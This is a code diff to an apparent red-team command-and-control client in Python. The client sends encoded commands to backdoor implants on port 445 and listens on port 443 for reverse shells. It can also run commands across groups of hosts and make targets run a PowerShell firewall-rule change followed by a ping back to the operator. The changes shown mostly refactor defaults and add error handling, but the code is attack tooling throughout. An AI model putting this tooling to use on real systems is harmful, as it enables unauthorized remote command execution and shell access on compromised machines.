@@ -16,25 +16,25 @@ parsedConfig = {}
 
 interface = None
 
-baseparams = {"MODE": "", "FILE": "", "XOR": True, "PWNBOARD": None}
+baseparams = {"MODE": None, "FILE": None, "XOR": True, "PWNBOARD": None}
 
 cmdparams = {
-    "RHOST": "",
+    "RHOST": None,
     "RPORT": 445,
     "COMMAND": "msg * hi",
     "TRANSPORT": "TCP",
 }
 
 shellparams = {
-    "RHOST": "",
+    "RHOST": None,
     "RPORT": 445,
-    "LHOST": "",
+    "LHOST": None,
     "TRANSPORT": "TCP",
 }
 
 groupparams = {
-    "GROUP": "",
-    "RHOST": "",
+    "GROUP": None,
+    "RHOST": None,
     "RPORT": 445,
     "COMMAND": "msg * hi",
     "TRANSPORT": "TCP",
@@ -54,12 +54,20 @@ def updatePwnboard(ip, mode):
         print(E)
 
 
-def listen():
-    nc = nclib.Netcat(listen=(shellparams["LHOST"], 443))
-    nc.interact() # TODO does the connection close cleanly?
-    nc.close()
+def listen(params):
+    try:
+        nc = nclib.Netcat(listen=(params["LHOST"], 443))
+        nc.interact() # TODO does the connection close cleanly?
+        nc.close()
+    except PermissionError:
+        print(colored(f"[-] Do not have sufficient permissions to listen on: 443.", "red"))
+        return
+    except socket.gaierror:
+        print(colored(f"[-] Potentially invalid: {params.get('LHOST')}.", "red"))
+        return
+    
     if baseparams["PWNBOARD"] is not None:
-        updatePwnboard(shellparams["RHOST"], "shell")
+        updatePwnboard(params["RHOST"], "shell")
     print(colored("\n[*] Shell closed.\n", "cyan"))
 
 def pingListen():
@@ -84,7 +92,7 @@ def initPing(params):
     import netifaces as ni
     try:
         targetIP = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
-    except ValueError:
+    except TypeError:
         return None
     pingmode = "FC-CM-{}\00".format("powershell -c netsh adv f a r dir=out protocol=icmpv4 action=allow name=\"y\"; ping " + targetIP + " -n 1; netsh adv f delete rule name=\"y\"")
     return pingmode
@@ -95,8 +103,8 @@ def validGroupKey():
     try:
         parsedConfig[key]
     except KeyError:
-        print( colored( f"[!] GROUP {key} does not exist. Setting GROUP value back to blank.\n", "red",))
-        groupparams["GROUP"] = ""
+        print( colored( f"[!] GROUP {key} does not exist. Setting GROUP value back to None.\n", "red",))
+        groupparams["GROUP"] = None
         return False
 
     return True
@@ -206,16 +214,16 @@ def verify(params):
         print( colored("[!] TRANSPORT set incorrectly. Setting TRANSPORT to TCP.\n", "red"))
         params["TRANSPORT"] = "TCP"
 
-    if baseparams["MODE"] != "GROUP" and (params["RHOST"] == "" or params["RHOST"] == None):
+    if baseparams["MODE"] != "GROUP" and params["RHOST"] is None:
         print(colored("[!] RHOST required.\n", "red"))
         passing = False
 
-    if baseparams["MODE"] == "SHELL" and (params["LHOST"] == "" or params["LHOST"] == None):
+    if baseparams["MODE"] == "SHELL" and params["LHOST"] is None:
         print(colored("[!] LHOST required.\n", "red"))
         passing = False
 
     if baseparams["MODE"] == "CMD" or baseparams["MODE"] == "GROUP":
-        if params["COMMAND"] == "" or params["COMMAND"] == None:
+        if params["COMMAND"] is None:
             print(colored("[!] COMMAND required.\n", "red"))
             passing = False
 
@@ -229,7 +237,7 @@ def executeShell():
     if verify(shellparams):
         ip = shellparams["RHOST"]
         plaintext = "FC-SH-{}\00".format(shellparams["LHOST"])
-        t = multiprocessing.Process(target=listen)
+        t = multiprocessing.Process(target=listen, args=(shellparams,))
         t.start() # start listener
         print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "cyan"))
         execute(plaintext, shellparams)
@@ -248,7 +256,7 @@ def executeCmd():
 def executeGroup():
     if verify(groupparams):
         plaintext = "FC-CM-{}\00".format(groupparams["COMMAND"])
-        if parsedConfig.get(groupparams.get("GROUP")) == "":
+        if parsedConfig.get(groupparams.get("GROUP")) is None:
             return
         groupList = getGroup()
         for iplist in groupList:
@@ -271,7 +279,7 @@ def executePing():
         execute(plaintext, cmdparams)
         t.join()
     elif baseparams["MODE"] == "GROUP" and verify(groupparams):
-        if parsedConfig.get(groupparams.get("GROUP")) == "":
+        if parsedConfig.get(groupparams.get("GROUP")) is None:
             return
         groupList = getGroup()
         plaintext = initPing(groupparams)
@@ -314,10 +322,10 @@ def execute(plaintext, params):
     try:
         sock.connect((params["RHOST"], params["RPORT"]))
         sock.send(payload)
+    except socket.gaierror:
+        print(colored(f"[-] Potentially invalid: {params.get('RHOST')} or {params.get('RPORT')}.", "red"))
     except (TimeoutError, ConnectionRefusedError, socket.timeout):
-        rport = params.get("RPORT")
-        rhost = params.get("RHOST")
-        print(colored(f"[-] Port {rport} not open on {rhost}.", "red"))
+        print(colored(f"[-] Port {params.get('RPORT')} not open on {params.get('RHOST')}.", "red"))
     finally:
         sock.close()
 
